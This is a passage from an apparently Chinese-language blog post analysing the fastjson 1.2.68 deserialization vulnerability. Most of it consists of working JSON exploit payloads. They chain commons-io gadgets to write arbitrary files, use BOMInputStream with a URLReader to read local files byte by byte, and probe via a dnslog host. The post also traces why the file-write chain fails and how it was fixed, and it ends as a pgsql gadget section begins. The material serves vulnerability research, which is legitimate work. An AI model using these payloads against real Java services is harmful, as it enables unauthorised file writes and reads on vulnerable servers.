<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;is&quot;</span>:&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;input&quot;</span>:&#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;reader&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;branch&quot;</span>:&#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;writer&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;file&quot;</span>: <span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;charset&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;closeBranch&quot;</span>:<span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是使用上面的<code>poc</code>新建的文件没有写入内容</p>
<h5 id="2-4-2-1-XmlStreamReader"><a href="#2-4-2-1-XmlStreamReader" class="headerlink" title="2.4.2.1 XmlStreamReader"></a>2.4.2.1 XmlStreamReader</h5><p>入口点<code>XmlStreamReader</code>类，</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/26.png" alt="26" style="zoom:50%;" /></div>

<h5 id="2-4-2-1-TeeInputStream"><a href="#2-4-2-1-TeeInputStream" class="headerlink" title="2.4.2.1 TeeInputStream"></a>2.4.2.1 TeeInputStream</h5><p>对应poc和<code>XmlStreamReader</code>的构造参数，is构造为<code>TeeInputStream</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TeeInputStream</span><span class="params">(InputStream input, OutputStream branch)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(input, branch, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数：input、branch</p>
<p><strong>a. input参数</strong><br>构造类：ReaderInputStream</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReaderInputStream</span><span class="params">(Reader reader, CharsetEncoder encoder, <span class="keyword">int</span> bufferSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.reader = reader;</span><br><span class="line">    <span class="keyword">this</span>.encoder = encoder;</span><br><span class="line">    <span class="keyword">this</span>.encoderIn = CharBuffer.allocate(bufferSize);</span><br><span class="line">    <span class="keyword">this</span>.encoderIn.flip();</span><br><span class="line">    <span class="keyword">this</span>.encoderOut = ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">this</span>.encoderOut.flip();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>reader使用了<code>CharSequenceReader</code>类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CharSequenceReader</span><span class="params">(CharSequence charSequence)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.charSequence = (CharSequence)(charSequence != <span class="keyword">null</span> ? charSequence : <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<code>CharSequenceReader</code>的构造方法中是<code>CharSequence</code> 类型作为参数，<code>CharSequence</code>是一个接口，像常用的<code>String</code>就实现了这个接口</li>
</ul>
<p><strong>branch参数</strong><br>构造类：WriterOutputStream</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WriterOutputStream</span><span class="params">(Writer writer, Charset charset, <span class="keyword">int</span> bufferSize, <span class="keyword">boolean</span> writeImmediately)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(writer, charset.newDecoder().onMalformedInput(CodingErrorAction.REPLACE).onUnmappableCharacter(CodingErrorAction.REPLACE).replaceWith(<span class="string">&quot;?&quot;</span>), bufferSize, writeImmediately);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>writer使用了<code>FileWriterWithEncoding</code>类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileWriterWithEncoding</span><span class="params">(String filename, String encoding, <span class="keyword">boolean</span> append)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(<span class="keyword">new</span> File(filename), encoding, append);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="2-4-2-3-触发流程"><a href="#2-4-2-3-触发流程" class="headerlink" title="2.4.2.3 触发流程"></a>2.4.2.3 触发流程</h5><p>如voidfyoo的文章中的分析，如图位置执行到<code>this.in.read()</code>，而这个in参数，在<code>BOMInputStream</code>实例化时，传入了<code>TeeInputStream</code></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/27.png" alt="27" style="zoom:50%;" /></div>

<p><code>TeeInputStream</code>的<code>read</code>方法如下，将<code>reader</code>中的内容写入到<code>branch</code>中</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/28.png" alt="28" style="zoom:50%;" /></div>

<p><code>ReaderInputStream#fillBufer</code></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/29.png" alt="29" style="zoom:50%;" /></div>

<p><code>CharSequenceReader#read</code></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/30.png" alt="30" style="zoom:50%;" /></div>

<p>Reader的流程结束，看一下<code>OutputStream</code>的<code>branch</code>的流程，这里没有记录，因为可以参考一下voidfyoo的文章</p>
<h5 id="2-4-2-4-无法写入文件内容"><a href="#2-4-2-4-无法写入文件内容" class="headerlink" title="2.4.2.4 无法写入文件内容"></a>2.4.2.4 无法写入文件内容</h5><p>这里在使用$ref循环对inputStream和outputStream进行读出写入后，创建的文件仍然没有被写入内容，<br>抛出如下异常，分析过后发现，fastjson反序列化过程中，实例化WriterOutputStream类的时候，没有使用payload中想要的构造方法，因此charset为空，在写入文件内容的时候抛出异常。。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create instance error, <span class="keyword">null</span>, <span class="keyword">public</span> org.apache.commons.io.input.XmlStreamReader(java.io.InputStream,java.lang.String,<span class="keyword">boolean</span>,java.lang.String) <span class="keyword">throws</span> java.io.IOException</span><br><span class="line">...</span><br><span class="line">Caused by: java.lang.NullPointerException</span><br><span class="line">	at org.apache.commons.io.output.WriterOutputStream.processInput(WriterOutputStream.java:<span class="number">280</span>)</span><br><span class="line">	at org.apache.commons.io.output.WriterOutputStream.write(WriterOutputStream.java:<span class="number">213</span>)</span><br><span class="line">	at org.apache.commons.io.input.TeeInputStream.read(TeeInputStream.java:<span class="number">129</span>)</span><br><span class="line">	at java.io.BufferedInputStream.fill(BufferedInputStream.java:<span class="number">246</span>)</span><br><span class="line">	at java.io.BufferedInputStream.read(BufferedInputStream.java:<span class="number">265</span>)</span><br><span class="line">	at org.apache.commons.io.input.BOMInputStream.getBOM(BOMInputStream.java:<span class="number">175</span>)</span><br><span class="line">	at org.apache.commons.io.input.BOMInputStream.getBOMCharsetName(BOMInputStream.java:<span class="number">201</span>)</span><br><span class="line">	at org.apache.commons.io.input.XmlStreamReader.doHttpStream(XmlStreamReader.java:<span class="number">439</span>)</span><br><span class="line">	at org.apache.commons.io.input.XmlStreamReader.&lt;init&gt;(XmlStreamReader.java:<span class="number">326</span>)</span><br></pre></td></tr></table></figure>
<p>如图，在deserialze中看到当前的构造方法是<code>org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.nio.charset.CharsetDecoder,int,boolean)</code>；</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/31.png" alt="31" style="zoom:50%;" /></div>

<p>则我们的poc中，是想要使用charsetName参数的构造方法，即</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WriterOutputStream</span><span class="params">(Writer writer, String charsetName, <span class="keyword">int</span> bufferSize, <span class="keyword">boolean</span> writeImmediately)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(writer, Charset.forName(charsetName), bufferSize, writeImmediately);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/32.png" alt="32" style="zoom:50%;" /></div>

<p>这里再回头看一下beaninfo在实例化的时候，在循环构造方法的地方，第四个构造方法排在前面会优先遍历，导致后面同样参数数量的构造方法<code>public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.lang.String,int,boolean)</code>不会被使用。</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/33.png" alt="33" style="zoom:50%;" /></div>

<p>最终导致在WriteOutputStream#processInput方法中，decoder为空，抛出空指针异常</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/34.png" alt="34" style="zoom:50%;" /></div>
这里看一下获取类构造方法的数组是怎么生成的，跟踪到Class.privateGetDeclaredConstructors方法，而获取构造方法数组的功能是一个native方法，到这就看不到了。。。

<div align=center><img src="/img/fastjson 1.2.68漏洞分析/35.png" alt="35" style="zoom:50%;" /></div>

<h5 id="2-4-2-5-修改利用链中WriteOutputStream的参数"><a href="#2-4-2-5-修改利用链中WriteOutputStream的参数" class="headerlink" title="2.4.2.5 修改利用链中WriteOutputStream的参数"></a>2.4.2.5 修改利用链中WriteOutputStream的参数</h5><p>根据前面的问题，将<code>WriterOutputStream</code>中的charsetName修改为，随便找一个继承CharsetDecoder类的方法，jdk内置的一些类都是私有方法，在fastjson中找到 <code>com.alibaba.fastjson.util.UTF8Decoder</code> 继承了这个抽象类；但是这个类并没有实现 <code>AutoCloseable</code> 接口，因此这里我手动开启了<code>autoTypeSupport</code>支持，显然这样做就不能达到通用了。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;reader&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;charSequence&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;some thing &gt; 8192&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;writer&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>: <span class="string">&quot;/tmp/common-write&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;encoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;decoder&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.util.UTF8Decoder&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">            <span class="attr">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;trigger&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;is&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;httpContentType&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;lenient&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultEncoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;trigger2&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;is&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;httpContentType&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;lenient&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultEncoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;trigger3&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;is&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;httpContentType&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;lenient&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultEncoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-4-3-读文件"><a href="#2-4-3-读文件" class="headerlink" title="2.4.3 读文件"></a>2.4.3 读文件</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;reader&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;file:///tmp/flag&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;boms&quot;</span>: [&#123;</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bytes&quot;</span>: [<span class="number">66</span>]</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;address&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.x.BOM&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>文件内容对应的ASCII正确</li>
</ul>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/36.png" alt="36" style="zoom:50%;" /></div>

<ul>
<li>文件不存在或ASCII不匹配</li>
</ul>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/37.png" alt="37" style="zoom:50%;" /></div>

<ul>
<li>web项目测试</li>
</ul>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/38.png" alt="38" style="zoom:50%;" /></div>

<blockquote>
<p>但是这种方法不一定在真实场景能利用，真实场景不一定会将解析的JSONObject直接返回回来</p>
</blockquote>
<p>也可以用来检测是否出网，或者检测是否&lt;=1.2.68版本</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;address&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.x.BOM&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;boms&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;bytes&quot;</span>: [],</span><br><span class="line">        <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;reader&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://dnslog&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-5-pgsql利用链"><a href="#2-5-pgsql利用链" class="headerlink" title="2.5 pgsql利用链"></a>2.5 pgsql利用链</h3><p><strong>maven:</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.22.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>依赖类：</strong></p>
<ul>
<li>org.postgresql.jdbc.PgConnection</li>
<li>org.springframework.context.support.ClassPathXmlApplicationContext</li>
</ul>
